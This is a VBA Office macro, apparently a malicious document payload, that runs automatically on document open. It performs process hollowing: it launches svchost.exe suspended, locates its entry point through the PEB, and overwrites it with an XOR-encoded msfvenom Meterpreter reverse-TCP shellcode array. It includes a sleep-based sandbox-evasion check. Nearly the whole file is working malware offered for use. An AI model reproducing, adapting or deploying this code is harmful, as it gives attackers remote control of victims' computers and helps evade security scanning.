Private Declare PtrSafe Function NtQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
Private Declare PtrSafe Function NtReadVirtualMemory Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
Private Declare PtrSafe Function NtResumeThread Lib "NTDLL" (ByVal hThread As LongPtr) As Long
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Sub RtlZeroMemory Lib "kernel32" (Destination As STARTUPINFOA, ByVal Length As Long)

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

Function hollow()

' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
    
    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
    Dim ProcInfo As LongPtr
    ProcInfo = pi.hProcess
    Dim PEBinfo As LongPtr

#If Win64 Then
    zwOutput = NtQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 16
    Dim AddrBuf(7) As Byte
#Else
    zwOutput = NtQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 8
    Dim AddrBuf(3) As Byte
#End If

    Dim tmp As Long
    tmp = 0
#If Win64 Then
    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = NtReadVirtualMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
    svcHostBase = AddrBuf(7) * (2 ^ 56)
    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#Else
    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = NtReadVirtualMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
    svcHostBase = AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#End If

    Dim data(512) As Byte
    readOutput2 = NtReadVirtualMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
    
    Dim e_lfanew_offset As Long
    e_lfanew_offset = data(60)

    Dim opthdr As Long
    opthdr = e_lfanew_offset + 40
    
    Dim entrypoint_rva As Long
    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
    entrypoint_rva = entrypoint_rva + data(opthdr)

    Dim addressOfEntryPoint As LongPtr
    addressOfEntryPoint = entrypoint_rva + svcHostBase
    
    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "0xfa"

' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 0xfa
sc = Array(204, 48, 229, 133, 192, 144, 170, 97, 48, 120, 39, 48, 113, 40, 52, 48, 120, 73, 180, 55, 85, 48, 237, 51, 80, 48, 237, 51, 40, 48, 237, 51, 16, 48, 105, 214, 122, 50, 43, 80, 249, 48, 237, 19, 96, 48, 87, 161, 156, 68, 7, 29, 50, 84, 70, 32, 241, 177, 107, 32, 49, 185, 132, 140, 98, 57, 55, 41, 187, 42, 70, 234, 114, 68, 46, 96, 224, 30, 231, 25, 40, _
115, 100, 110, 181, 10, 102, 97, 48, 243, 230, 233, 48, 120, 102, 41, 181, 184, 18, 6, 120, 121, 182, 37, 187, 56, 70, 234, 120, 96, 47, 96, 224, 40, 133, 55, 125, 73, 175, 41, 207, 177, 39, 234, 4, 240, 46, 96, 230, 48, 87, 161, 113, 185, 175, 108, 156, 57, 103, 160, 8, 152, 19, 144, 124, 123, 42, 69, 56, 61, 95, 176, 69, 160, 62, 37, 187, 56, 66, 40, 49, _
168, 0, 32, 187, 116, 46, 37, 187, 56, 122, 40, 49, 168, 39, 234, 52, 240, 39, 57, 113, 32, 56, 41, 49, 168, 63, 59, 113, 32, 39, 56, 113, 34, 46, 226, 220, 88, 39, 51, 207, 152, 62, 32, 105, 34, 46, 234, 34, 145, 45, 158, 207, 135, 59, 40, 142, 15, 21, 83, 111, 75, 84, 97, 48, 57, 48, 40, 185, 158, 46, 224, 220, 216, 103, 97, 48, 49, 239, 132, 121, _
196, 100, 97, 49, 195, 166, 201, 41, 110, 39, 53, 121, 241, 130, 45, 185, 137, 39, 219, 124, 15, 64, 102, 207, 173, 42, 232, 218, 16, 103, 96, 48, 120, 63, 32, 138, 81, 230, 10, 48, 135, 179, 11, 58, 57, 56, 49, 96, 53, 87, 168, 125, 73, 166, 41, 207, 184, 46, 232, 242, 48, 153, 161, 120, 241, 167, 32, 138, 146, 105, 190, 208, 135, 179, 41, 185, 191, 12, 113, 113, _
32, 42, 232, 210, 48, 239, 152, 113, 194, 255, 196, 68, 25, 153, 180, 181, 184, 18, 107, 121, 135, 168, 20, 213, 144, 245, 97, 48, 120, 46, 226, 220, 104, 46, 232, 210, 53, 87, 168, 90, 124, 39, 57, 120, 241, 159, 32, 138, 122, 191, 169, 111, 135, 179, 226, 200, 120, 24, 52, 120, 251, 162, 65, 110, 241, 144, 11, 112, 57, 63, 9, 48, 104, 102, 97, 113, 32, 46, 232, 194, _
48, 87, 168, 113, 194, 62, 197, 99, 157, 153, 180, 120, 241, 165, 40, 185, 191, 43, 80, 249, 49, 239, 145, 120, 241, 188, 41, 185, 129, 39, 219, 50, 161, 174, 62, 207, 173, 229, 153, 48, 5, 78, 57, 113, 47, 63, 9, 48, 56, 102, 97, 113, 32, 12, 97, 106, 57, 220, 106, 31, 119, 86, 158, 229, 47, 63, 32, 138, 13, 8, 44, 81, 135, 179, 40, 207, 182, 143, 93, 207, _
135, 153, 41, 49, 187, 46, 72, 246, 48, 227, 151, 69, 204, 39, 158, 215, 32, 12, 97, 105, 195, 134, 124, 26, 114, 39, 232, 234, 135, 179)

    Dim scSize As Long
    scSize = UBound(sc)
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y
    
    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
    b = NtResumeThread(pi.hThread)
 
End Function
